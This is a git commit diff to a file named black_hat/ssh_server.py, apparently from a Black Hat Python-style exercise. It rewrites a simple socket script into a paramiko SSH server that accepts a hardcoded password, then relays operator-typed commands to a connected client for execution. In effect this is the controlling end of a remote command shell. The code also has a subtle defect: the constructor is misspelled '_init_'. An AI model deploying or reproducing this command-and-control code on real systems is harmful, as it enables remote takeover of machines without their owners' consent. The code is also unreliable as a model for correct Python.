64d5800a2d285463c79efbc80dd91ece1abb70a5
maciej233 <m.sobiech.wat@gmail.com>
2022-08-02 14:33:05 +0200

    copied

--- black_hat/ssh_server.py
+++ black_hat/ssh_server.py
@@ -1,41 +1,67 @@
-"""Server side"""
-
-from tkinter import EXCEPTION
+import os
 import paramiko
+import socket
 import sys
 import threading
-import socket
 
-class Server():
-    def __init__(self):
+CWD = os.path.dirname(os.path.realpath(__file__))
+HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, '.test_rsa.key'))
+
+
+class Server (paramiko.ServerInterface):
+    def _init_(self):
         self.event = threading.Event()
 
     def check_channel_request(self, kind, chanid):
         if kind == 'session':
             return paramiko.OPEN_SUCCEEDED
-        return paramiko.FAILED_ADMINISTRATIVELY_PROHIBITED
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
 
     def check_auth_password(self, username, password):
-        if username == 'maciej' and password == 'password':
+        if (username == 'tim') and (password == 'sekret'):
             return paramiko.AUTH_SUCCESSFUL
 
-def main():
-    SERVER_IP = '127.0.0.1'
-    SERVER_PORT = '2222'
+
+if __name__ == '__main__':
+    server = '192.168.1.207'
+    ssh_port = 2222
     try:
-        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        connection.bind((SERVER_IP, SERVER_PORT))
-        connection.listen(100)
-        print("******CONNECTING TO SERVER*******")
-        client, address = connection.accept()
-        print(f"You have connected to server {address[0]}:{address[1]}\n", client)
-    except EXCEPTION as e:
-        print(f"Exception occured {e}")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((server, ssh_port))
+        sock.listen(100)
+        print('[+] Listening for connection ...')
+        client, addr = sock.accept()
+    except Exception as e:
+        print('[-] Listen failed: ' + str(e))
         sys.exit(1)
-    
+    else:
+        print(f'[+] Got a connection! from {addr}')
 
+    bhSession = paramiko.Transport(client)
+    bhSession.add_server_key(HOSTKEY)
+    server = Server()
+    bhSession.start_server(server=server)
 
+    chan = bhSession.accept(20)
+    if chan is None:
+        print('*** No channel.')
+        sys.exit(1)
 
-if __name__ == "__main__":
-    main()
+    print('[+] Authenticated!')
+    print(chan.recv(1024).decode())
+    chan.send('Welcome to bh_ssh')
+    try:
+        while True:
+            command = input("Enter command: ")
+            if command != 'exit':
+                chan.send(command)
+                r = chan.recv(8192)
+                print(r.decode())
+            else:
+                chan.send('exit')
+                print('exiting')
+                bhSession.close()
+                break
+    except KeyboardInterrupt:
+        bhSession.close()
